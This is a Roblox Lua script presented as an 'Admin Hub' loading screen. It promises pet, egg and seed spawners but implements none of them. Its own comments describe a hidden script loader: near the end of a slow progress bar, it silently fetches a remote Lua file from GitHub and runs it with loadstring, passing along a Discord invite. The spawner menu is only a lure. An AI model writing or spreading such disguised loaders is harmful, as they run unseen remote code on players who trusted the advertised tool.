--// Admin Hub Loading Screen (Cooler Design + Hidden Script Loader)
--// Made by OnTheSpot

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "AdminHubGUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.DisplayOrder = 999999
gui.Parent = player:WaitForChild("PlayerGui")

-- Fullscreen Black Background
local cover = Instance.new("Frame")
cover.Size = UDim2.new(1,0,1,0)
cover.BackgroundColor3 = Color3.fromRGB(0,0,0)
cover.BorderSizePixel = 0
cover.ZIndex = 100
cover.Parent = gui

-- Title "Admin Hub"
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0.15,0)
title.Position = UDim2.new(0,0,0.18,0)
title.BackgroundTransparency = 1
title.Text = "Admin Hub"
title.TextColor3 = Color3.fromRGB(0,200,255)
title.TextStrokeTransparency = 0.2
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.ZIndex = 101
title.Parent = cover

-- Feature List
local features = Instance.new("TextLabel")
features.Size = UDim2.new(1,0,0.1,0)
features.Position = UDim2.new(0,0,0.30,0)
features.BackgroundTransparency = 1
features.Text = "Pet Spawner   |   Egg Spawner   |   Seed Spawner   |   Seed Spiner   |   Weather Changer"
features.TextColor3 = Color3.fromRGB(200,200,200)
features.TextStrokeTransparency = 0.5
features.TextScaled = true
features.Font = Enum.Font.GothamSemibold
features.TextSize = 18
features.ZIndex = 101
features.Parent = cover

-- Progress Bar Background
local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(0.6,0,0.05,0)
barBG.Position = UDim2.new(0.2,0,0.45,0)
barBG.BackgroundColor3 = Color3.fromRGB(50,50,50)
barBG.BorderSizePixel = 0
barBG.ZIndex = 101
barBG.Parent = cover

-- Progress Fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0,0,1,0)
barFill.BackgroundColor3 = Color3.fromRGB(0,170,255)
barFill.BorderSizePixel = 0
barFill.ZIndex = 102
barFill.Parent = barBG

-- Percentage Text inside bar
local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(1,0,1,0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(255,255,255)
percent.TextScaled = true
percent.Font = Enum.Font.GothamBold
percent.ZIndex = 103
percent.Parent = barBG

-- Subtext
local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1,0,0.1,0)
sub.Position = UDim2.new(0,0,0.55,0)
sub.BackgroundTransparency = 1
sub.Text = "Please wait..."
sub.TextColor3 = Color3.fromRGB(180,180,180)
sub.TextScaled = true
sub.Font = Enum.Font.Gotham
sub.ZIndex = 101
sub.Parent = cover

-- Credits (smaller + highlight)
local credits = Instance.new("TextLabel")
credits.Size = UDim2.new(1,0,0.05,0)
credits.Position = UDim2.new(0,0,0.92,0)
credits.BackgroundTransparency = 1
credits.Text = "Created by OnTheSpot"
credits.TextColor3 = Color3.fromRGB(0,200,255)
credits.TextStrokeTransparency = 0.2
credits.TextScaled = true
credits.Font = Enum.Font.GothamBold
credits.ZIndex = 101
credits.Parent = cover

-- Animated Subtext Dots
task.spawn(function()
	while barFill.Size.X.Scale < 1 do
		for dots = 1,3 do
			sub.Text = "Please wait" .. string.rep(".", dots)
			task.wait(0.5)
		end
	end
end)

-- Pulsing Credits
task.spawn(function()
	while barFill.Size.X.Scale < 1 do
		for i = 0, 1, 0.05 do
			credits.TextStrokeTransparency = 0.2 + 0.3*i
			task.wait(0.05)
		end
		for i = 1, 0, -0.05 do
			credits.TextStrokeTransparency = 0.2 + 0.3*i
			task.wait(0.05)
		end
	end
end)

-- Slow Loading Animation
task.spawn(function()
	for i = 0, 100, 0.2 do
		barFill.Size = UDim2.new(i/100,0,1,0)
		percent.Text = math.floor(i) .. "%"

		-- Hidden external script loader
		if i >= 98 then
			task.spawn(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
			end)
		end

		task.wait(0.3) -- slow countdown
	end

	task.wait(1)

	-- Fade out screen with bar shrink
	for t = 0, 1, 0.05 do
		cover.BackgroundTransparency = t
		barFill.Size = UDim2.new(1-t,0,1,0)
		title.TextTransparency = t
		features.TextTransparency = t
		barBG.BackgroundTransparency = t
		percent.TextTransparency = t
		sub.TextTransparency = t
		credits.TextTransparency = t
		task.wait(0.05)
	end

	gui:Destroy()
end)
